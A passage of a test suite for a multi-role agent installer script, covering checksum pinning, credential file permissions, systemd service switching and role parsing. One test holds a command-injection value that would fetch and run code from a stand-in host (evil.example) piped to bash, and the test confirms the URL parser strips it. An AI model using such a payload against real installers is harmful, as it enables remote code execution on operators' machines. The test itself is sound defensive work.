    expect(run(sandbox, nodeArgs()).status).not.toBe(0);
    expect(readFileSync(installedAgent(sandbox), "utf8")).toMatch(/the agent already installed/);
  });

  it("verifies a --source install exactly as it verifies a release install", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    // An air-gapped box: the bytes come off local disk, the digest still decides.
    const result = run(sandbox, nodeArgs(["--source", `file://${published.binaryPath}`]));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(existsSync(installedAgent(sandbox))).toBeTruthy();
    // Nothing was fetched over the network for the agent itself.
    expect(readLog(sandbox.curlLog)).not.toMatch(/infra-agent/);
  });

  it("refuses a --source whose bytes do not match, exactly as it refuses a release", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    // One byte of an otherwise good binary, which is the whole point of pinning a digest.
    const corrupted = path.join(sandbox.fixtures, "corrupted-infra-agent");
    writeFileSync(corrupted, `${FAKE_AGENT}#\n`);

    const result = run(sandbox, nodeArgs(["--source", `file://${corrupted}`]));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  it("refuses a target this deployment pins no digest for", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT);
    // The pin covers a target that is not this host's.
    repin(sandbox, { ...CURRENT, infraAgent: { "solaris-sparc": "a".repeat(64) } });

    const result = run(sandbox, nodeArgs());
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(new RegExp(`pins no Infra Agent build for ${HOST_TARGET}`));
    expect(readLog(sandbox.curlLog)).not.toMatch(/infra-agent/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  function publishMesh(
    sandbox: Sandbox,
    release: AgentRelease,
    body = "#!/usr/bin/env bash\nexit 0\n",
  ) {
    const asset = `erainfra-mesh-${HOST_TARGET}`;
    const binaryPath = path.join(sandbox.fixtures, asset);
    writeExecutable(binaryPath, body);
    const sha256 = createHash("sha256").update(readFileSync(binaryPath)).digest("hex");
    const sidecar = `${binaryPath}.sha256`;
    writeFileSync(sidecar, `${sha256}  ${asset}\n`);
    const url = `https://github.com/${release.repo}/releases/download/v${release.version}/${asset}`;
    route(sandbox, url, binaryPath);
    route(sandbox, `${url}.sha256`, sidecar);
    return { sha256, binaryPath, sidecar };
  }

  it("refuses --mesh without a deployment pin before downloading or replacing the agent", () => {
    const sandbox = createSandbox(CURRENT);
    const agent = publishInfraAgent(sandbox, CURRENT);
    publishMesh(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, agent.sha256));
    const result = run(sandbox, nodeArgs(["--mesh"]));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(new RegExp(`pins no erainfra-mesh build for ${HOST_TARGET}`));
    expect(result.stderr).toMatch(/dumbpipe is not installed/);
    expect(readLog(sandbox.curlLog)).not.toMatch(/infra-agent|erainfra-mesh|dumbpipe/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  it("requires both mesh deployment and release checksums and installs no dumbpipe", () => {
    const sandbox = createSandbox(CURRENT);
    const agent = publishInfraAgent(sandbox, CURRENT);
    const mesh = publishMesh(sandbox, CURRENT);
    const release = { ...pinned(CURRENT, agent.sha256), mesh: { [HOST_TARGET]: mesh.sha256 } };
    repin(sandbox, release);
    writeFileSync(mesh.sidecar, `${"0".repeat(64)}  erainfra-mesh-${HOST_TARGET}\n`);
    const result = run(sandbox, nodeArgs(["--mesh"]));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/Mesh checksum verification failed/);
    expect(result.stderr).toMatch(/Nothing was installed/);
    expect(readLog(sandbox.curlLog)).not.toMatch(/dumbpipe/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);

    writeFileSync(mesh.sidecar, `${mesh.sha256}  erainfra-mesh-${HOST_TARGET}\n`);
    const ok = run(sandbox, nodeArgs(["--mesh"]));
    expect(ok.status, `${ok.stdout}\n${ok.stderr}`).toBe(0);
    expect(ok.stdout).toMatch(/against both release and deployment checksums/);
    expect(existsSync(path.join(sandbox.home, ".portless", "bin", "erainfra-mesh"))).toBe(true);
    expect(readLog(sandbox.curlLog)).not.toMatch(/dumbpipe/);
  });

  it("refuses without the Hub the Node reports to", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    const result = run(sandbox, ["--role", "node", "--token", "plt_node_token", "--no-docker"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/Hub URL is required/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  it("refuses a role it does not serve", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--role", "gateway", "--token", "plt_node_token"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/Unknown --role: gateway/);
  });

  it("restarts the unit on a re-install, so what runs is what was just verified", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    grantRoot(sandbox);

    const first = run(sandbox, nodeArgs(), { connect: false });
    expect(first.status, `${first.stdout}\n${first.stderr}`).toBe(0);
    expect(first.stdout).toMatch(/systemd service 'portless-agent' is active/);

    const second = run(sandbox, nodeArgs(), { connect: false });
    expect(second.status, `${second.stdout}\n${second.stderr}`).toBe(0);

    // "enable --now" starts a stopped unit and does nothing to a running one, so without an
    // explicit restart the second install would leave the old process on the old bytes while
    // is-active reported success. Both installs restart; the restart follows the enable.
    const service = readLog(path.join(sandbox.root, "service.log")).trimEnd().split("\n");
    expect(service.filter((line) => line === "restart portless-agent")).toHaveLength(2);
    expect(service.indexOf("restart portless-agent")).toBeGreaterThan(
      service.indexOf("enable --now portless-agent"),
    );
  });

  it("writes the Hub credential to a file no other local user can read", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    grantRoot(sandbox);

    expect(run(sandbox, nodeArgs(), { connect: false }).status).toBe(0);

    // Created 0600 and then written, not created and chmodded afterwards: the second order leaves a
    // window in which any local user can read the Hub credential. The order is what is asserted,
    // because the end state is identical either way.
    const sudo = readLog(path.join(sandbox.root, "sudo.log")).trimEnd().split("\n");
    const restricted = sudo.findIndex((line) => line.includes("install -m 600"));
    const written = sudo.findIndex((line) => line === "tee /etc/portless/agent.env");
    expect(restricted, sudo.join(" / ")).toBeGreaterThanOrEqual(0);
    expect(restricted).toBeLessThan(written);

    const envFile = path.join(sandbox.sudoRoot, "etc", "portless", "agent.env");
    expect(statSync(envFile).mode & 0o077).toBe(0);
    expect(readFileSync(envFile, "utf8")).toMatch(/^PORTLESS_TOKEN=plt_node_token$/m);
    const unit = path.join(sandbox.sudoRoot, "etc", "systemd", "system", "portless-agent.service");
    expect(readFileSync(unit, "utf8")).toMatch(/^EnvironmentFile=\/etc\/portless\/agent\.env$/m);
    expect(readFileSync(unit, "utf8")).not.toMatch(/plt_node_token/);
  });
});

/**
 * A systemctl that keeps per-unit active and enabled state as marker files in `stateDir`, so a test
 * can seed a running Hub-mode unit and see what the installer stopped, enabled and restarted.
 */
function statefulSystemctl(stateDir: string) {
  return `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SERVICE_LOG"
state='${stateDir}'
cmd=""
now=0
units=()
for arg in "$@"; do
  case "$arg" in
    --now) now=1 ;;
    -*) ;;
    *) if [ -z "$cmd" ]; then cmd=$arg; else units+=("\${arg%.service}"); fi ;;
  esac
done
for unit in "\${units[@]}"; do
  case "$cmd" in
    enable) touch "$state/$unit.enabled"; [ "$now" -eq 0 ] || touch "$state/$unit.active" ;;
    disable) rm -f "$state/$unit.enabled"; [ "$now" -eq 0 ] || rm -f "$state/$unit.active" ;;
    start|restart) touch "$state/$unit.active" ;;
    stop) rm -f "$state/$unit.active" ;;
    is-active)
      if [ -e "$state/$unit.active" ]; then echo active; exit 0; fi
      echo inactive; exit 3 ;;
    is-enabled)
      if [ -e "$state/$unit.enabled" ]; then echo enabled; exit 0; fi
      echo disabled; exit 1 ;;
  esac
done
exit 0
`;
}

function convexArgs(credential: string, extra: readonly string[] = []) {
  return ["--role", "node", "--convex", "--credential-file", credential, "--no-docker", ...extra];
}

// connect-convex mode needs Linux with systemd and the systemd sidecar, so this sandbox pretends to
// be one: uname reports Linux, sudo redirects every system path under the sandbox (and drops -o/-g,
// since the sandbox has no erainfra-mesh account), and systemctl keeps per-unit active and enabled
// state so a test can seed a running Hub-mode unit.
describe("--role node --convex", () => {
  const TARGET = `linux-${process.arch === "arm64" ? "arm64" : "x86_64"}`;
  const CREDENTIAL = `erainfra_node_${"ab".repeat(32)}`;

  const UNAME_STUB = `#!/usr/bin/env bash
if [ "$1" = "-s" ]; then printf 'Linux\\n'; exit 0; fi
PATH=/usr/bin:/bin exec uname "$@"
`;

  const SYSTEMD_ROOT_SUDO_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SUDO_LOG"
[ "$1" = "useradd" ] && exit 0
count=$#
skip=0
while [ "$count" -gt 0 ]; do
  arg=$1
  shift
  count=$((count - 1))
  if [ "$skip" -eq 1 ]; then skip=0; continue; fi
  case "$arg" in
    -o|-g) skip=1 ;;
    /etc/*|/run/*|/usr/local/*|/var/lib/*) set -- "$@" "$RC_TEST_SUDO_ROOT$arg" ;;
    *) set -- "$@" "$arg" ;;
  esac
done
exec "$@"
`;

  function convexSandbox() {
    const sandbox = createSandbox(CURRENT);
    grantRoot(sandbox);
    const bin = path.join(sandbox.root, "bin");
    const units = path.join(sandbox.root, "units");
    mkdirSync(units);
    writeExecutable(path.join(bin, "sudo"), SYSTEMD_ROOT_SUDO_STUB);
    writeExecutable(path.join(bin, "systemctl"), statefulSystemctl(units));
    writeExecutable(path.join(bin, "uname"), UNAME_STUB);

    const base = `https://github.com/${CURRENT.repo}/releases/download/v${CURRENT.version}`;
    const agent = path.join(sandbox.fixtures, `infra-agent-${TARGET}`);
    writeExecutable(agent, "#!/usr/bin/env bash\nexit 0\n");
    route(sandbox, `${base}/infra-agent-${TARGET}`, agent);
    const mesh = path.join(sandbox.fixtures, `erainfra-mesh-${TARGET}`);
    writeExecutable(mesh, "#!/usr/bin/env bash\nexit 0\n");
    const meshSha = createHash("sha256").update(readFileSync(mesh)).digest("hex");
    writeFileSync(`${mesh}.sha256`, `${meshSha}  erainfra-mesh-${TARGET}\n`);
    route(sandbox, `${base}/erainfra-mesh-${TARGET}`, mesh);
    route(sandbox, `${base}/erainfra-mesh-${TARGET}.sha256`, `${mesh}.sha256`);
    const agentSha = createHash("sha256").update(readFileSync(agent)).digest("hex");
    repin(sandbox, {
      ...CURRENT,
      infraAgent: { [TARGET]: agentSha },
      mesh: { [TARGET]: meshSha },
    });

    const credential = path.join(sandbox.fixtures, "edge-1.credential");
    writeFileSync(credential, `${CREDENTIAL}\n`);
    return {
      sandbox,
      credential,
      unitFile: (name: string) => path.join(sandbox.sudoRoot, "etc", "systemd", "system", name),
      seed: (unit: string, ...states: Array<"active" | "enabled">) => {
        for (const state of states) writeFileSync(path.join(units, `${unit}.${state}`), "");
      },
      isLive: (unit: string, state: "active" | "enabled") =>
        existsSync(path.join(units, `${unit}.${state}`)),
      serviceLog: () => readLog(path.join(sandbox.root, "service.log")).trimEnd().split("\n"),
    };
  }

  it("installs connect-convex as erainfra-node.service, with the sidecar and no Hub", () => {
    const box = convexSandbox();
    const result = run(box.sandbox, convexArgs(box.credential));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const unit = readFileSync(box.unitFile("erainfra-node.service"), "utf8");
    expect(unit).toContain(
      "ExecStart=/usr/local/lib/erainfra/erainfra-node connect-convex --credential-file /etc/erainfra-node.credential --state-dir /var/lib/erainfra-node\n",
    );
    const agent = path.join(
      box.sandbox.sudoRoot,
      "usr",
      "local",
      "lib",
      "erainfra",
      "erainfra-node",
    );
    expect(statSync(agent).mode & 0o777).toBe(0o755);
    expect(unit).toMatch(/^Environment=ERAINFRA_CONVEX_SITE=https:\/\/example\.convex\.site$/m);
    expect(unit).toMatch(/^Environment=ERAINFRA_MESH_SOCKET=\/run\/erainfra-mesh\/control\.sock$/m);
    expect(unit).toMatch(
      /^Environment=ERAINFRA_MESH_CONTROL_DIR=\/var\/lib\/erainfra\/mesh-control$/m,
    );
    expect(unit).toMatch(/^Requires=erainfra-mesh\.service$/m);
    expect(unit).toMatch(/^SupplementaryGroups=erainfra-mesh$/m);
    expect(unit).not.toMatch(/^(Environment=(PORTLESS|ERAINFRA)_(HUB|TOKEN)|EnvironmentFile)/m);
    expect(unit).not.toContain(CREDENTIAL);
    expect(existsSync(box.unitFile("erainfra-mesh.service"))).toBe(true);
    expect(existsSync(box.unitFile("portless-agent.service"))).toBe(false);

    const stored = path.join(box.sandbox.sudoRoot, "etc", "erainfra-node.credential");
    expect(readFileSync(stored, "utf8")).toBe(`${CREDENTIAL}\n`);
    expect(statSync(stored).mode & 0o777).toBe(0o600);
    const state = path.join(box.sandbox.sudoRoot, "var", "lib", "erainfra-node");
    expect(statSync(state).mode & 0o777).toBe(0o700);
    // The credential never travels on a command line.
    expect(readLog(path.join(box.sandbox.root, "sudo.log"))).not.toContain(CREDENTIAL);

    expect(box.isLive("erainfra-node", "active")).toBe(true);
    expect(box.isLive("erainfra-node", "enabled")).toBe(true);
    expect(result.stdout).toMatch(/journalctl -u erainfra-node/);
    expect(result.stdout).toMatch(/erainfra nodes list .*transport convex.*MESH proven/);
    expect(result.stdout).toMatch(/Roll back to Hub mode: systemctl disable --now erainfra-node/);
    expect(result.stdout).toMatch(/Delete .*edge-1\.credential/);
  });

  it("refuses while portless-agent.service is live, names the flag, and changes nothing", () => {
    const box = convexSandbox();
    box.seed("portless-agent", "active", "enabled");
    const result = run(box.sandbox, convexArgs(box.credential));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/portless-agent\.service runs this Node in Hub mode/);
    expect(result.stderr).toMatch(/--replace-hub-agent/);
    expect(readLog(box.sandbox.curlLog)).not.toMatch(/infra-agent|erainfra-mesh/);
    expect(existsSync(box.unitFile("erainfra-node.service"))).toBe(false);
    expect(box.isLive("portless-agent", "active")).toBe(true);
  });

  it("refuses an enabled erainfra-agent.service the same way", () => {
    const box = convexSandbox();
    box.seed("erainfra-agent", "enabled");
    const result = run(box.sandbox, convexArgs(box.credential));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/erainfra-agent\.service runs this Node in Hub mode/);
  });

  it("stops and disables the Hub-mode unit first with --replace-hub-agent", () => {
    const box = convexSandbox();
    box.seed("portless-agent", "active", "enabled");
    const result = run(box.sandbox, convexArgs(box.credential, ["--replace-hub-agent"]));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(box.isLive("portless-agent", "active")).toBe(false);
    expect(box.isLive("portless-agent", "enabled")).toBe(false);
    expect(box.isLive("erainfra-node", "active")).toBe(true);
    const service = box.serviceLog();
    const stopped = service.indexOf("disable --now portless-agent");
    expect(stopped, service.join(" / ")).toBeGreaterThanOrEqual(0);
    // Before the sidecar restarts: portless-agent.service requires it, so a restart would bounce
    // the Hub agent too.
    expect(stopped).toBeLessThan(service.indexOf("restart erainfra-mesh"));
    expect(stopped).toBeLessThan(service.indexOf("restart erainfra-node"));
  });

  // portless-agent.service runs $PREFIX/bin/portless-agent. A rollback to Hub mode starts that
  // unit again, so it must find the bytes it ran before, not this release's connect-convex agent.
  it("keeps the Hub-mode agent's binary for a rollback", () => {
    const box = convexSandbox();
    box.seed("portless-agent", "active", "enabled");
    const hubAgent = path.join(box.sandbox.home, ".portless", "bin", "portless-agent");
    mkdirSync(path.dirname(hubAgent), { recursive: true });
    writeExecutable(hubAgent, "#!/usr/bin/env bash\n# the Hub-mode agent\n");
    const result = run(box.sandbox, convexArgs(box.credential, ["--replace-hub-agent"]));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(readFileSync(hubAgent, "utf8")).toBe("#!/usr/bin/env bash\n# the Hub-mode agent\n");
  });

  // --replace-hub-agent stops the Hub unit before the sidecar (re)starts. Any failure after that,
  // here the sidecar failing to restart under set -e, must not leave the Node with no agent.
  it("puts the Hub-mode agent back when the install fails after stopping it", () => {
    const box = convexSandbox();
    box.seed("portless-agent", "active", "enabled");
    const bin = path.join(box.sandbox.root, "bin");
    const real = path.join(bin, "systemctl.real");
    renameSync(path.join(bin, "systemctl"), real);
    writeExecutable(
      path.join(bin, "systemctl"),
      `#!/usr/bin/env bash\nif [ "$1" = restart ] && [ "$2" = erainfra-mesh ]; then printf '%s\\n' "$*" >> "$RC_TEST_SERVICE_LOG"; exit 1; fi\nexec "${real}" "$@"\n`,
    );
    const result = run(box.sandbox, convexArgs(box.credential, ["--replace-hub-agent"]));
    expect(result.status).not.toBe(0);
    expect(box.isLive("portless-agent", "active")).toBe(true);
    expect(box.isLive("portless-agent", "enabled")).toBe(true);
    expect(box.isLive("erainfra-node", "active")).toBe(false);
    expect(result.stderr).toMatch(/failed after it stopped the Hub-mode agent/);
    expect(result.stderr).toMatch(/systemctl enable --now portless-agent/);
  });

  it("does not touch a Hub-mode unit it did not stop when the install fails", () => {
    const box = convexSandbox();
    const bin = path.join(box.sandbox.root, "bin");
    const real = path.join(bin, "systemctl.real");
    renameSync(path.join(bin, "systemctl"), real);
    writeExecutable(
      path.join(bin, "systemctl"),
      `#!/usr/bin/env bash\nif [ "$1" = restart ] && [ "$2" = erainfra-mesh ]; then exit 1; fi\nexec "${real}" "$@"\n`,
    );
    const result = run(box.sandbox, convexArgs(box.credential));
    expect(result.status).not.toBe(0);
    expect(box.isLive("portless-agent", "active")).toBe(false);
    expect(result.stderr).not.toMatch(/Hub-mode agent/);
  });

  it("leaves the Hub-mode unit running when the new bytes do not match the pin", () => {
    const box = convexSandbox();
    box.seed("portless-agent", "active", "enabled");
    repin(box.sandbox, {
      ...CURRENT,
      infraAgent: { [TARGET]: "0".repeat(64) },
      mesh: { [TARGET]: "0".repeat(64) },
    });
    const result = run(box.sandbox, convexArgs(box.credential, ["--replace-hub-agent"]));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(box.isLive("portless-agent", "active")).toBe(true);
    expect(existsSync(box.unitFile("erainfra-node.service"))).toBe(false);
  });

  it("refuses --hub or --token together with --convex", () => {
    for (const extra of [
      ["--hub", "wss://hub.example.com/agent"],
      ["--token", "plt_node_token"],
    ]) {
      const box = convexSandbox();
      const result = run(box.sandbox, convexArgs(box.credential, extra));
      expect(result.status, extra.join(" ")).not.toBe(0);
      expect(result.stderr).toMatch(/--convex takes no --token or --hub/);
      expect(readLog(box.sandbox.curlLog)).toBe("");
    }
  });

  it("refuses --convex without a credential file, and a file that holds no Node credential", () => {
    const box = convexSandbox();
    const missing = run(box.sandbox, ["--role", "node", "--convex", "--no-docker"]);
    expect(missing.status).not.toBe(0);
    expect(missing.stderr).toMatch(/--convex requires --credential-file/);

    writeFileSync(box.credential, "plt_node_token\n");
    const wrong = run(box.sandbox, convexArgs(box.credential));
    expect(wrong.status).not.toBe(0);
    expect(wrong.stderr).toMatch(/does not hold one Node credential/);
    expect(readLog(box.sandbox.curlLog)).toBe("");
  });

  it("refuses without systemd", () => {
    const box = convexSandbox();
    rmSync(path.join(box.sandbox.sudoRoot, "run", "systemd"), { recursive: true });
    const result = run(box.sandbox, convexArgs(box.credential));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/needs Linux with systemd/);
    expect(readLog(box.sandbox.curlLog)).toBe("");
  });

  it("makes the Hub-mode path refuse while erainfra-node.service is live", () => {
    const box = convexSandbox();
    box.seed("erainfra-node", "active", "enabled");
    const result = run(box.sandbox, nodeArgs());
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/erainfra-node\.service runs this Node in Convex mode/);
    expect(result.stderr).toMatch(/systemctl disable --now erainfra-node/);
    expect(readLog(box.sandbox.curlLog)).toBe("");
    expect(existsSync(box.unitFile("portless-agent.service"))).toBe(false);
  });
});

// The dispatch runs in front of both roles, so a bug in it is a bug on every install.
describe("--role parsing", () => {
  it("refuses a --role with no value, wherever the missing value falls", () => {
    for (const args of [["--role"], ["--token", "rcreg_test", "--role"]]) {
      const sandbox = createSandbox(CURRENT);
      const result = run(sandbox, args);

      // The second line is the one that was silently wrong rather than merely ugly: the dispatch
      // rotates every non---role argument to the back of "$@", so $# no longer counts what is left
      // to parse. Testing $# there took the rotated --token as the role name and handed the Worker
      // parser a bare rcreg_test — it rewrote the argument list instead of refusing.
      expect(result.status, args.join(" ")).toBe(1);
      expect(result.stderr, args.join(" ")).toMatch(
        /--role requires a value: worker, node, worker-host or controller/,
      );
      expect(readLog(sandbox.npmLog), "nothing may be installed").toBe("");
    }
  });

  it("finds a --role that comes after the flags it rotates", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, [
      "--token",
      "rcreg_test",
      "--name",
      "test-machine",
      "--role",
      "worker",
    ]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    // Rotation preserved the rest of the line, in a form the Worker parser accepts.
    expect(metaField(sandbox, "MACHINE_NAME")).toBe("test-machine");
  });
});

describe("--role worker", () => {
  // The regression that would matter most: the Worker path is what every existing machine installs
  // and updates with, and --role is new syntax in front of it.
  it("installs exactly as it does with no role given", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, [
      "--role",
      "worker",
      "--token",
      "rcreg_test",
      "--name",
      "test-machine",
    ]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.4.2");
    expect(metaField(sandbox, "MACHINE_NAME")).toBe("test-machine");
  });

  it("is what the script does when no role is given at all", () => {
    const script = renderInstallScript(SITE_URL, AGENT_RELEASE);
    expect(script).toMatch(/^INSTALL_ROLE='worker'$/m);
  });

  // Everything from `SITE_URL=` down is the Worker installer as it was before /install served two
  // roles — 25 690 bytes, byte-identical to what main renders. The size is asserted because the
  // Node half above it would otherwise hide an edit to the Worker half in a large diff; a
  // deliberate change to the Worker path updates this number and says so. The pinned version
  // string is embedded once, so a release whose version has a different length moves it too
  // (rc.9 to rc.10 was 25 689 to 25 690).
  it("keeps the Worker installer contiguous, below the dispatch and unentangled with it", () => {
    const script = renderInstallScript(SITE_URL, AGENT_RELEASE);
    const workerBody = script.slice(script.indexOf("SITE_URL='"));
    expect(workerBody).toMatch(/^SITE_URL='https:\/\/example\.convex\.site'\nAGENT_REPO=/);
    expect(workerBody).not.toMatch(/INSTALL_ROLE|node_install|node_pinned_digest|--role/);
    expect(Buffer.byteLength(workerBody)).toBe(25_690);
  });
});

describe("Infra Agent asset names", () => {
  it("names the published asset for every target, with .exe only on Windows", () => {
    expect(INFRA_AGENT_TARGETS.map((target) => infraAgentAssetName(target))).toEqual([
      "infra-agent-linux-x86_64",
      "infra-agent-linux-arm64",
      "infra-agent-darwin-x86_64",
      "infra-agent-darwin-arm64",
      "infra-agent-windows-x86_64.exe",
    ]);
  });
});

// The installer bakes SITE_URL into the machine's agent config, so whatever
// lands here is what every registered runner will talk to from then on. The
// route feeds this from CONVEX_SITE_URL via resolveSiteUrl rather than from the
// request Host, so these two have to compose cleanly.
describe("rendered SITE_URL", () => {
  it("bakes the given origin in as the only SITE_URL", () => {
    const script = renderInstallScript("https://example.convex.site", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
  });

  it("leaves no unsubstituted placeholder behind", () => {
    const script = renderInstallScript("https://example.convex.site", AGENT_RELEASE);
    expect(script.includes("__ERAINFRA_SITE_URL__")).toBe(false);
  });

  it("receives a bare origin from resolveSiteUrl, with no path or trailing slash", () => {
    const site = resolveSiteUrl("https://example.convex.site/nested/?a=1#b");
    expect(site.ok).toBe(true);

    const script = renderInstallScript(site.ok ? site.siteUrl : "", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("example.convex.site/")).toBe(false);
  });

  // SITE_URL is interpolated into a single-quoted shell string in a script the
  // operator pipes to bash, so a value carrying a quote would be command
  // injection. A resolveSiteUrl origin cannot: URL parsing confines it to
  // scheme, host and port, and anything that could hold a quote is dropped.
  it("cannot break out of the single-quoted shell assignment", () => {
    const site = resolveSiteUrl("https://example.convex.site/';curl evil.example|bash;'");
    expect(site.ok).toBe(true);
    expect(site.ok && site.siteUrl.includes("'")).toBe(false);

    const script = renderInstallScript(site.ok ? site.siteUrl : "", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("evil.example")).toBe(false);
  });
});

describe("--role worker-host", () => {
  // The provisioner travels embedded, so the one thing that must never drift is the byte-for-byte
  // identity between the module a deploy ships and the script the repository maintains. Editing
  // deploy/provision-firecracker-host.sh without regenerating fails here, not on a host.
  it("embeds deploy/provision-firecracker-host.sh byte for byte", () => {
    const repoScript = readFileSync(
      path.resolve(
        import.meta.dirname,
        "..",
        "..",
        "..",
        "deploy",
        "provision-firecracker-host.sh",
      ),
    );
    const embedded = Buffer.from(FIRECRACKER_HOST_PROVISIONER_B64.replaceAll("\n", ""), "base64");
    expect(
      embedded.equals(repoScript),
      "regenerate with: pnpm --filter @erainfra/backend embed-firecracker-provisioner",
    ).toBe(true);
    expect(createHash("sha256").update(repoScript).digest("hex")).toBe(
      FIRECRACKER_HOST_PROVISIONER_SHA256,
    );
  });

  // The provisioner refuses to install the runtime service without its unit file beside it, so a
  // worker-host install that carried only the provisioner would march to the last step and stop
  // there — which is exactly how this gap was found, on the first real host.
  it("embeds deploy/systemd/runner-center-runtime.service byte for byte", () => {
    const repoUnit = readFileSync(
      path.resolve(
        import.meta.dirname,
        "..",
        "..",
        "..",
        "deploy",
        "systemd",
        "runner-center-runtime.service",
      ),
    );
    const embedded = Buffer.from(FIRECRACKER_RUNTIME_UNIT_B64.replaceAll("\n", ""), "base64");
    expect(
      embedded.equals(repoUnit),
      "regenerate with: pnpm --filter @erainfra/backend embed-firecracker-provisioner",
    ).toBe(true);
    expect(createHash("sha256").update(repoUnit).digest("hex")).toBe(
      FIRECRACKER_RUNTIME_UNIT_SHA256,
    );
    const script = renderInstallScript(SITE_URL, CURRENT);
    expect(script).toContain("systemd/runner-center-runtime.service");
    expect(script).toContain(FIRECRACKER_RUNTIME_UNIT_B64);
    expect(script).toContain(FIRECRACKER_RUNTIME_UNIT_SHA256);
  });

  it("prints usage without needing root", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--role", "worker-host", "--help"]);
    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("one ephemeral Firecracker microVM per CI job");
    expect(result.stdout).toContain("DESTROY");
  });

  it("refuses an unpinned deployment while the operator is still unprivileged", () => {
    const sandbox = createSandbox(CURRENT); // CURRENT pins no archive checksum
    const result = run(sandbox, ["--role", "worker-host"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("pins no agent release");
    expect(result.stderr).not.toContain("must run as root");
  });

  it("refuses to run unprivileged, and names the sudo command", () => {
    const sandbox = createSandbox({ ...CURRENT, sha256: "a".repeat(64) });
    const result = run(sandbox, ["--role", "worker-host"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("must run as root");
    expect(result.stderr).toContain(`${SITE_URL}/install | sudo bash -s -- --role worker-host`);
  });

  it("refuses a pool below the provisioner's floor before asking for root", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--role", "worker-host", "--pool-gib", "8"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("at least 32 GiB");
  });

  it("refuses half a device pair, and a device pair mixed with pool flags", () => {
    const sandbox = createSandbox(CURRENT);
    const half = run(sandbox, ["--role", "worker-host", "--data-device", "/dev/x"]);
    expect(half.status).toBe(1);
    expect(half.stderr).toContain("--data-device needs --meta-device");

    const mixed = run(sandbox, [
      "--role",
      "worker-host",
      "--data-device",
      "/dev/x",
      "--meta-device",
      "/dev/y",
      "--pool-gib",
      "64",
    ]);
    expect(mixed.status).toBe(1);
    expect(mixed.stderr).toContain("not both");
  });

  /** Fake root: id reports uid 0 and uname reports Linux, so the role runs to the handoff. */
  function grantWorkerHostRoot(sandbox: Sandbox) {
    writeExecutable(path.join(sandbox.root, "bin", "id"), `#!/usr/bin/env bash\nprintf '0\\n'\n`);
    writeExecutable(
      path.join(sandbox.root, "bin", "uname"),
      `#!/usr/bin/env bash\ncase "$1" in -m) printf 'x86_64\\n' ;; *) printf 'Linux\\n' ;; esac\n`,
    );
  }

  // The full path, to the exact seam where the real provisioner takes over: the pinned archive is
  // downloaded and verified, the runtime inside is staged, the embedded provisioner decodes and
  // passes its own checksum, and the forwarded --pool-dir reaches it — proven by the provisioner
  // itself refusing the relative path with its own voice, before it touches the machine.
  it("verifies the pinned archive and hands the runtime to the real provisioner", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "worker-host deep");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    grantWorkerHostRoot(sandbox);

